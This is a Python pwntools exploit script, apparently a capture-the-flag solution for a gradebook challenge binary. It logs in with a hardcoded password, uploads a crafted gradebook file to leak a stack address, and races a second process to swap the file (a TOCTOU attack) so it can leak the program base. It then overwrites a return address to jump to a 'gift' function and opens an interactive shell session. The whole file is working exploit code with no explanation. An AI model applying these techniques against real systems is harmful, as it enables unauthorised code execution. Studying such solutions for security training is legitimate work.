#!/usr/bin/python3
# -*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = "error"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "120"]

LOCAL = 1
filename = "./chal"
if LOCAL:
    # io = process(filename)
    p1 = process(filename)
else:
    remote_service = ""
    remote_service = remote_service.strip().split(":")
    p1 = remote(remote_service[0], int(remote_service[1]))
elf = ELF(filename, checksec=False)
libc = ELF(elf.libc.path, checksec=False)

rl = lambda p, a=False: p.recvline(a)
ru = lambda p, a, b=True: p.recvuntil(a, b)
rn = lambda p, x: p.recvn(x)
s = lambda p, x: p.send(x)
sl = lambda p, x: p.sendline(x)
sa = lambda p, a, b: p.sendafter(a, b)
sla = lambda p, a, b: p.sendlineafter(a, b)
ia = lambda p: p.interactive()
dbg = lambda p, text=None: gdb.attach(p, text)
lg = lambda s: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s, eval(s)))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))


def login(p):
    ru(p, b"PLEASE LOGON WITH USER PASSWORD:\n")
    sl(p, b"pencil")


def cmd(p, choice):
    ru(p, b"QUIT")
    sl(p, i2b(choice))


def open_stu_file(p, filename):
    cmd(p, 1)
    ru(p, b"ENTER FILENAME:")
    sl(p, filename)


def upload_stu_file(p, filename = b"x", data = b"", size=0):
    cmd(p, 2)
    ru(p, b"ENTER FILENAME:")
    sl(p, filename)
    if filename == b"x":
        ru(p, b"GENERATED FILENAME: ")
        temp_filename = ru(p, b"\n", "drop")
    else:
        temp_filename = filename
    ru(p, b"ENTER FILE SIZE:")
    if size == 0:
        size = len(data)
    sl(p, i2b(size))
    ru(p, b"SEND BINARY FILE DATA:")
    s(p, data)
    return temp_filename


def add_garde(p, class_, title, grade, teacher, room, period):
    cmd(p, 1)
    sla(p, b":", class_)
    sla(p, b":", title)
    sla(p, b":", grade)
    sla(p, b":", teacher)
    sla(p, b":", room)
    sla(p, b":", i2b(period))


def update_grade(p, idx, grade):
    cmd(p, 2)
    sla(p, b"WHICH GRADE:", i2b(idx))
    sla(p, b"NEW GRADE:", grade)


addr = 0x4752ade50000
def construct_gradebook(booksize = 0, offset = 0x60, data3 = 0):
    payload = b"GR\xad\xe5"  # magic
    payload += p32(2077)
    payload += b"eastXueLian".ljust(0x20, b"\x00")
    payload += b"LIANLIANGONGZHU".ljust(0x20, b"\x00")
    payload += p64(booksize)
    payload += p64(offset)
    payload += p64(data3)

    if booksize:
        payload += b"LianCL".ljust(8, b"\x00")
        payload += b"COURSE".ljust(22, b"\x00")
        payload += b"A+".ljust(2, b"\x00")
        payload += b"aaaa".ljust(12, b"\x00")
        payload += b"NAIL".ljust(4, b"\x00")
        payload += p64(0)
        payload += p64(data3)
    else:
        payload += b"".ljust(8, b"\x00")
        payload += b"COURSE".ljust(22, b"\x00")
        payload += b"A+".ljust(2, b"\x00")
        payload += b"aaaa".ljust(12, b"\x00")
        payload += b"NAIL".ljust(4, b"\x00")
        payload += p64(0)
        payload += p64(0)

    if booksize == 0:
        booksize = len(payload)
        payload = payload[:0x48] + p64(booksize) + payload[0x50:]
        payload = payload[:0x58] + p64(booksize) + payload[0x60:]
    return payload

process_ = 0
def debugPID(p):
    global process_
    process_ = p
    lg("process_.pid")
    input()

# gradebook_data = open("./gradebook", "rb").read()
gradebook_data = construct_gradebook()
login(p1)

debugPID(p1)

victim = upload_stu_file(p1, b"x", gradebook_data, len(gradebook_data))
open_stu_file(p1, victim)

# Leak stack base first.
ru(p1, b"NAIL     ")
ret_addr = u64_ex(ru(p1, b"\n", "drop")) + 0x38
lg("ret_addr")

# process TOCTOU attack
expbook_data = construct_gradebook(((2<<63) - 1), 0x60, ret_addr - addr)
p2 = process(filename)
login(p2)
upload_stu_file(p2, victim, expbook_data, len(expbook_data))
open_stu_file(p2, victim)
p2.close()

cmd(p1, 4)
ru(p1, b"NAIL")
ru(p1, b"NAIL")
ru(p1, b"\n")
elf_base = u64_ex(ru(p1, b"pencil", "drop").replace(b" ", b"")) - 0x2386
gift_addr = elf_base + 0x16E4
lg("elf_base")

add_garde(p1, p64(gift_addr), b"a", b"a", b"a", b"a", 1)

ia(p1)
